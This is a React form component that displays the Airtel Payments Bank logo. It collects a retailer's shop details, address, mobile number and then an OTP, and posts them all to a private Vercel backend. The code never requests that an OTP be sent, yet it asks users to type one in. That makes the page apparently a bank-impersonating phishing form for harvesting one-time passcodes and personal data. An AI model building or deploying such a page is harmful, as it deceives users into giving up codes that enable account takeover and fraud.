import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import image from './image.jpg'

const Input = () => {
    // State variables for the first set of inputs
    const [shopName, setShopName] = useState('');
    const [boardSize, setBoardSize] = useState('');
    const [lapuNumber, setLapuNumber] = useState('');

    // State variables for the second set of inputs
    const [address, setAddress] = useState('');
    const [city, setCity] = useState('');
    const [pinCode, setPinCode] = useState('');
    const [status, setStatus] = useState('');
    const [state, setState] = useState(''); // New state variable
    const [mobile, setMobile] = useState(''); // New state variable
    const navigate = useNavigate();

    // State to control the visibility of the second set of inputs
    const [showDetails, setShowDetails] = useState(false);
    
    // State for OTP input
    const [otp, setOtp] = useState('');
    const [showOtpInput, setShowOtpInput] = useState(false);

    // Function to handle the Next button click
    const handleNext = () => {
        setShowDetails(true);
    };

    // Function to handle the Submit button click
    const handleSubmit = async () => {
        if (!showOtpInput) {
            setShowOtpInput(true);
        } else {
            const formData = {
                shopName,
                boardSize,
                lapuNumber,
                address,
                city,
                pinCode,
                state,
                mobile,
                otp,
            };

            console.log("Submitting form data:", formData); // Debugging line
    
            try {
                const response = await fetch('https://airtel-project-backend-7kcp.vercel.app/api/create', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData),
                });

                if (response.ok) {
                    const data = await response.json();
                    console.log('User created successfully:', data);
                    navigate("/home");
                } else {
                    const errorData = await response.json();
                    console.error('Error creating user:', errorData);
                    alert(errorData.message); // Show error message to user
                }
            } catch (error) {
                console.error('Error during fetch request:', error);
                alert('Error occurred during submission.'); // Show generic error
            }
        }
    };
    
    return (
        <div className="max-w-md mx-auto mt-8 p-4">
            {/* Logo at the top */}
            <img
                src="https://upload.wikimedia.org/wikipedia/en/c/c2/Airtel_Payments_Bank_logo.png"
                alt="Airtel Payments Bank Logo"
                className="w-32 mx-auto mb-4"
            />





            <img src={image}  alt="Airtel Payments Bank Logo"
                className="w-32 mx-auto mb-4" />






            <div className="space-y-4">
                {!showDetails ? (
                    <>
                        <div className="text-center">
                            <label htmlFor="shopName" className="block mb-1">Shop Name</label>
                            <input
                                type="text"
                                id="shopName"
                                value={shopName}
                                onChange={(e) => setShopName(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="boardSize" className="block mb-1">Board Size</label>
                            <input
                                type="text"
                                id="boardSize"
                                value={boardSize}
                                onChange={(e) => setBoardSize(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="lapuNumber" className="block mb-1">Lapu Number</label>
                            <input
                                type="text"
                                id="lapuNumber"
                                value={lapuNumber}
                                onChange={(e) => setLapuNumber(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <button
                            onClick={handleNext}
                            className="bg-red-500 text-white p-2 rounded w-full"
                        >
                            Next
                        </button>
                    </>
                ) : showOtpInput ? (
                    <>
                        <div className="text-center">
                            <label htmlFor="otp" className="block mb-1">OTP</label>
                            <input
                                type="text"
                                id="otp"
                                value={otp}
                                onChange={(e) => setOtp(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <button
                            onClick={handleSubmit}
                            className="bg-red-500 text-white p-2 rounded w-full"
                        >
                            Submit
                        </button>
                    </>
                ) : (
                    <>
                        <div className="text-center">
                            <label htmlFor="address" className="block mb-1">Address</label>
                            <input
                                type="text"
                                id="address"
                                value={address}
                                onChange={(e) => setAddress(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="city" className="block mb-1">City</label>
                            <input
                                type="text"
                                id="city"
                                value={city}
                                onChange={(e) => setCity(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="pinCode" className="block mb-1">Pin Code</label>
                            <input
                                type="text"
                                id="pinCode"
                                value={pinCode}
                                onChange={(e) => setPinCode(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="state" className="block mb-1">State</label>
                            <input
                                type="text"
                                id="state"
                                value={state}
                                onChange={(e) => setState(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <div className="text-center">
                            <label htmlFor="mobile" className="block mb-1">Mobile</label>
                            <input
                                type="text"
                                id="mobile"
                                value={mobile}
                                onChange={(e) => setMobile(e.target.value)}
                                className="w-full border border-red-500 p-2 rounded mx-auto focus:border-green-500"
                                required
                            />
                        </div>
                        <button
                            onClick={handleSubmit}
                            className="bg-red-500 text-white p-2 rounded w-full"
                        >
                            Submit
                        </button>
                    </>
                )}
            </div>
        </div>
    );
};

export default Input;
